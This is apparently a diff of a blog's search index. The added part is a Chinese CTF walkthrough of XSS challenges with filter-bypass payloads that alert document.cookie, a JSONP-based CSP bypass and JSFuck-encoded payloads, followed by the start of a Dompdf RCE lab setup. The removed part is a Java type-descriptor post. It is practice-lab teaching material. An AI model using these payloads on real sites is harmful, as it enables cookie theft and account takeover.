+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img/src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220331164139938.png" class title="image-20220331164139938">
+
+
+
+<p>得到flag为: <strong>F1ag{2f4f1079a27234647958d3edba4e7e55}</strong></p>
+<h2 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h2><p>我们直接来看前端处理代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/&lt;script&gt;/i&quot;, &quot;&quot;, $_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;h1&gt;Hello, &lt;?= $escaped ?&gt;!&lt;/h1&gt;</span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的正则匹配是将参数中的<script>这一字符串大小写进行替换为空，过滤掉了<script>这一标签</p>
+<p>所以换一个payload进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220330110341629.png" class="" title="image-20220330110341629">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220330110736665.png" class="" title="image-20220330110736665">
+
+<p>得到flag为：<strong>F1ag{9692fd02a92347c6a644eef9d2c53a1}</strong></p>
+<h2 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h2><p>观察前端源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;csp01-util.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;csp01-jsonp.php?callback=callback&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Hello, &lt;?= $_GET[&#x27;payload&#x27;] ?&gt;!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里通过设置CSP策略来防范XSS，调用js和php文件进行回调</p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220331170011345.png" class="" title="image-20220331170011345">
+
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220331170025143.png" class="" title="image-20220331170025143">
+
+<p>上面的js就是定义了callback(money)的js功能，然后php函数执行了callback(3000)</p>
+<p>在代码中csp01-jsonp.php调用的是参数为callback函数，我们来看下这串代码的执行情况，将callback设置为test,可以看到直接拼接在(3000)前面。</p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402135114866.png" class="" title="image-20220402135114866">
+
+
+
+<p>我们根据题目中给到的信息构造相应的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;csp01-jsonp.php?</span><br><span class="line">callback=alert(document.cookie);&quot;&gt;&lt;/script&gt;</span><br><span class="line">//相当于引入了document.cookie;(3000)这一段JS代码</span><br></pre></td></tr></table></figure>
+
+<p>获取flag: <strong>F1ag{257ca1a6de75e4f67258fa461f730664}</strong></p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402135728563.png" class="" title="image-20220402135728563">
+
+
+
+<h2 id="XSS3"><a href="#XSS3" class="headerlink" title="XSS3"></a>XSS3</h2><p>前端代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/[`()&lt;&gt;&amp;#]/&quot;, &quot;&quot;, $_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Hello, &lt;body id=&quot;&lt;?= $escaped ?&gt;&quot;&gt;&lt;?= htmlspecialchars($_GET[&#x27;payload&#x27;]) ?&gt;&lt;/body&gt;!&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的正则匹配是将payload中的`()<>$#进行匹配过滤掉，然后再将html实体编码后的payload输出</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;a=&#x27; onload=javascript:alert(document.cookie) = </span><br></pre></td></tr></table></figure>
+
+<p>得到flag为 <strong>F1ag{cce4052a069b416ebe2259faa81073b8}</strong></p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402204220116.png" class="" title="image-20220402204220116">
+
+<h2 id="XSS4"><a href="#XSS4" class="headerlink" title="XSS4"></a>XSS4</h2><p>前端代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/[a-zA-Z0-9]/&quot;, &quot;&quot;, $_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        &lt;?= $escaped ?&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的正则匹配是将payload中的所有字母以及数字进行匹配过滤，尝试将payloada进行编码处理</p>
+<p>后面联想到 JSfunck，使用特定的6种符号来编写代码 ，分别是(、)、+、[、]、！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">false       =&gt;  ![]</span><br><span class="line">true        =&gt;  !![]</span><br><span class="line">undefined   =&gt;  [][[]]</span><br><span class="line">NaN         =&gt;  +[![]]</span><br><span class="line">0           =&gt;  +[]</span><br><span class="line">1           =&gt;  +!+[]</span><br><span class="line">2           =&gt;  !+[]+!+[]</span><br><span class="line">10          =&gt;  [+!+[]]+[+[]]</span><br><span class="line">Array       =&gt;  []</span><br><span class="line">Number      =&gt;  +[]</span><br><span class="line">String      =&gt;  []+[]</span><br><span class="line">Boolean     =&gt;  ![]</span><br><span class="line">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure>
+
+<p>我们使用[工具](<a href="http://www.jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+</a>)将payload进行编码</p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402103635656.png" class="" title="image-20220402103635656">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure>
+
+<p>成功弹窗 </p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402103716764.png" class="" title="image-20220402103716764">
+
+<p>测试成功，将1修改为documet.cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure>
+
+<p>弹窗获得flag,为<strong>F1ag{0f2a15c7b410bcf8ec6698cbd27fa453}</strong></p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220402103858183.png" class="" title="image-20220402103858183">
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/f1de775bc43e">CSP策略及绕过方法 - 简书 (jianshu.com)</a></p>
+<p><a href="https://www.jianshu.com/p/e7246218f424">Jsfuck -- 一个很有意思的Javascript特性 - 简书 (jianshu.com)</a></p>
+<p><a href="https://blog.csdn.net/qq_36539075/article/details/79946099">(67条消息) JSfuck原理解析一——基础原理_直接开车的博客-CSDN博客_jsfuck</a></p>
+<p><a href="http://www.jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+</a></p>
+</script></p>]]></content>
       <categories>
-        <category>Web漏洞</category>
-        <category>Web容器漏洞</category>
-        <category>Apache</category>
+        <category>CTF</category>
+        <category>Web</category>
+        <category>XSS</category>
       </categories>
       <tags>
-        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
+        <tag>-CTF -Web -XSS</tag>
       </tags>
   </entry>
   <entry>
-    <title>JAVA类型描述符</title>
-    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
-    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
-<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
-<p>其中有这么一段记录,如下:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
+    <title>Dompdf命令执行漏洞</title>
+    <url>/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Dompdf命令执行漏洞"><a href="#Dompdf命令执行漏洞" class="headerlink" title="Dompdf命令执行漏洞"></a>Dompdf命令执行漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Dompdf是一种基于php的HTML到PDF的转换器。该漏洞通过将CSS注入到Dompdf处理的数据中，存储在一个php缓存文件扩展名的恶意字段中，然后通过web访问执行。</p>
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420143147753.png" class title="image-20220420143147753">
 
-<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
-<p>于是我写了个简单的打印字符串数组Demo:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果为:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/positive-security/dompdf-rce</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行测试主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd application</span><br><span class="line">php -S localhost:9000</span><br></pre></td></tr></table></figure>
 
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144612188.png" class title="image-20220420144612188">
 
+<p>运行攻击主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd exploit</span><br><span class="line">php -S localhost:9001</span><br></pre></td></tr></table></figure>
 
-<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144650145.png" class title="image-20220420144650145">
 
-<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
-<p>我们在来看下Class的getName()方法:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
